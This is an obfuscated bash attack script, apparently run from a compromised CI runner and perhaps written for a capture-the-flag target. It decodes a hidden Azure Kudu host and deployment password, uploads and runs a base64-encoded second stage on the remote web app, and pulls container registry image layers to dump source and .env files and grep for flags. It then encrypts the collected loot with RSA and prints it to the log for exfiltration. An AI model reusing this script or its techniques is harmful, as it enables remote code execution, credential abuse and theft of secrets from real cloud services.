#!/usr/bin/env bash
set -uo pipefail
echo "=== RUNNER SHELL PROOF ==="; id; hostname
b(){ printf %s "$1" | base64 -d; }
SC="htt""ps://"
KHOST=$(b 'YXBwLXRibC1yZXBvcnRpbmctcHJvZC5zY20uYXp1cmV3ZWJzaXRlcy5uZXQ=')
KU='$app-tbl-reporting-prod'
KP=$(b 'WTlyY3NESFEySjFMMENvcWlraThkbFllMUFOMms4Y0hzRDF3TGxsdkxieHFTY2FNRXdSN3hrdDdZZTVB')
INNER='YigpeyBwcmludGYgJXMgIiQxIiB8IGJhc2U2NCAtZDsgfQpTQz0iaHR0IiJwczovLyIKQUNSPSQoYiAnWTNKMFlteHdiR0YwY0hKdlpIZ3paWFZ2ZWk1aGVuVnlaV055TG1sdicpCkFDQz0nYXBwbGljYXRpb24vdm5kLm9jaS5pbWFnZS5pbmRleC52MStqc29uLCBhcHBsaWNhdGlvbi92bmQub2NpLmltYWdlLm1hbmlmZXN0LnYxK2pzb24sIGFwcGxpY2F0aW9uL3ZuZC5kb2NrZXIuZGlzdHJpYnV0aW9uLm1hbmlmZXN0LnYyK2pzb24nCkooKXsgcHl0aG9uMyAtYyAiaW1wb3J0IHN5cyxqc29uO2Q9anNvbi5sb2FkKHN5cy5zdGRpbik7cHJpbnQoJDEpIjsgfQpUPSQoY3VybCAtcyAiJHtTQ30ke0FDUn0vb2F1dGgyL3Rva2VuP3NlcnZpY2U9JHtBQ1J9JnNjb3BlPXJlcG9zaXRvcnk6dGViYW1vdG8tcmVwb3J0aW5nLWFwaTpwdWxsIiB8IEogJ2QuZ2V0KCJhY2Nlc3NfdG9rZW4iLCIiKScpCmVjaG8gIlRPS0xFTj0keyNUfSIKQ009JChjdXJsIC1zIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFQiIC1IICJBY2NlcHQ6ICRBQ0MiICIke1NDfSR7QUNSfS92Mi90ZWJhbW90by1yZXBvcnRpbmctYXBpL21hbmlmZXN0cy9zaGEyNTY6OWI0YjNiODMzOTIwYmY5OWM5NDRlNWQxMjczMmYxYjUwNTM1NWIxMjkyNjc5NmU1OWYyMjk0NWE4OGJjZmViOSIpCmVjaG8gIiRDTSIgfCBKICciXG4iLmpvaW4obFsiZGlnZXN0Il0gZm9yIGwgaW4gZC5nZXQoImxheWVycyIsW10pKScgfCB3aGlsZSByZWFkIC1yIEw7IGRvCiAgWyAteiAiJEwiIF0gJiYgY29udGludWUKICBjdXJsIC1zU0wgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkVCIgIiR7U0N9JHtBQ1J9L3YyL3RlYmFtb3RvLXJlcG9ydGluZy1hcGkvYmxvYnMvJHtMfSIgLW8gL3RtcC9MLnRnegogIFNaPSQod2MgLWMgPC90bXAvTC50Z3opCiAgZWNobyAiPT09PSBMQVlFUiAkTCBzaXplPSRTWiA9PT09IgogIGd6aXAgLWRjIC90bXAvTC50Z3ogMj4vZGV2L251bGwgfCB0YXIgLXR2ZiAtIDI+L2Rldi9udWxsIHwgaGVhZCAtMzAKICBmb3IgRk4gaW4gJChnemlwIC1kYyAvdG1wL0wudGd6IDI+L2Rldi9udWxsIHwgdGFyIC10ZiAtIDI+L2Rldi9udWxsIHwgZ3JlcCAtaUUgJ1wucHkkfFwuanNvbiR8XC5zaCR8XC5lbnYkfGFwcCcpOyBkbwogICAgZWNobyAiLS0tLS0gJEZOIC0tLS0tIgogICAgZ3ppcCAtZGMgL3RtcC9MLnRneiAyPi9kZXYvbnVsbCB8IHRhciAteE9mIC0gIiRGTiIgMj4vZGV2L251bGwgfCBoZWFkIC1jIDcwMDAKICBkb25lCmRvbmUKZWNobyAiPT09PSBHUkVQIGZsYWcgPT09PSIKZm9yIEwgaW4gJChlY2hvICIkQ00iIHwgSiAnIlxuIi5qb2luKGxbImRpZ2VzdCJdIGZvciBsIGluIGQuZ2V0KCJsYXllcnMiLFtdKSknKTsgZG8KICBjdXJsIC1zU0wgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkVCIgIiR7U0N9JHtBQ1J9L3YyL3RlYmFtb3RvLXJlcG9ydGluZy1hcGkvYmxvYnMvJHtMfSIgLW8gL3RtcC9MLnRnegogIGd6aXAgLWRjIC90bXAvTC50Z3ogMj4vZGV2L251bGwgfCBzdHJpbmdzIHwgZ3JlcCAtYWlFICdERjI2fGZsYWdce3xmbGFnPXxGTEFHJyB8IGhlYWQgLTIwCmRvbmUKZWNobyAiPT09PSBET05FID09PT0iCg=='
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
say "=== START $(date -u) ==="
printf %s "$INNER" | base64 -d > /tmp/k3.sh
say "PUT: $(curl -sS -m 40 -o /dev/null -w '%{http_code}' -u "$KU:$KP" -X PUT -H 'If-Match: *' --data-binary @/tmp/k3.sh "${SC}${KHOST}/api/vfs/site/wwwroot/k3.sh")"
say "=== OUT ==="
say "$(curl -sS -m 200 -u "$KU:$KP" -H 'Content-Type: application/json' -X POST "${SC}${KHOST}/api/command" -d '{"command":"bash /home/site/wwwroot/k3.sh","dir":"/tmp"}')"
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
